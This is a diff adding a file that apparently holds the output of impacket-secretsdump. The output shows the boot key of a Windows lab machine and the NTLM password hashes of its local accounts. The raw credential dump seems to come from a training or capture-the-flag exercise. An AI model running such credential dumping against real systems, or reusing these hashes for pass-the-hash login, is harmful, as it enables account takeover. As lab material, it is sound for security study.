@@ -1,0 +1,22 @@
+#impacket-secretsdump -sam sam -system system LOCAL
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Target system bootKey: 0x113ea3ca0475e56f19cbbb31a94bc062
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4e99f1d659d2e324c8d9e4cfd743fe06:::
+lab:1001:aad3b435b51404eeaad3b435b51404ee:dcd30387c708d1277fbc3f810e469679:::
+alpha:1002:aad3b435b51404eeaad3b435b51404ee:135222c7bf1b75a4416183ca7045d799:::
+bravo:1003:aad3b435b51404eeaad3b435b51404ee:a1cc9e2fb1702a2b7afe4664b5c31f49:::
+charlie:1004:aad3b435b51404eeaad3b435b51404ee:c7e4e6f7f772cd634591a74bfb9cd3cd:::
+delta:1005:aad3b435b51404eeaad3b435b51404ee:651492f8c6dc448f3f024b0855c07c81:::
+echo:1006:aad3b435b51404eeaad3b435b51404ee:6ea97b77b679b34e8ced0e7756c1c977:::
+foxtrot:1007:aad3b435b51404eeaad3b435b51404ee:bf61c148de30681b6f05b657c410911c:::
+golf:1008:aad3b435b51404eeaad3b435b51404ee:f56a8399599f1be040128b1dd9623c29:::
+hotel:1009:aad3b435b51404eeaad3b435b51404ee:21c059bc077cfcd2c20c1c86416edaba:::
+india:1010:aad3b435b51404eeaad3b435b51404ee:10b8bde2da71238f9b17f8436353016c:::
+juliett:1011:aad3b435b51404eeaad3b435b51404ee:7f37024c76edd1305560f045cac1264d:::
+kilo:1012:aad3b435b51404eeaad3b435b51404ee:92eef931baec4adf10530af7bc4ed21d:::
+[*] Cleaning up...
